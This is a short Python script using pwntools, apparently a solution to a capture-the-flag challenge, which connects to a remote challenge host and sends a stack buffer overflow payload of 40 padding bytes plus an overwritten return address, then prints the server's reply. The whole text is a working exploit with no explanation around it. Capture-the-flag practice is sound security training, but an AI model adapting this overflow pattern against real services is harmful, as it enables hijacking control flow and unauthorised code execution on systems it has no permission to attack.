from pwn import *

wah = remote("challs.actf.co", 31224)

payload = b"A" * 40 + p64(0x401236)

wah.recvn(4)
wah.sendline(payload)
print(wah.recvall())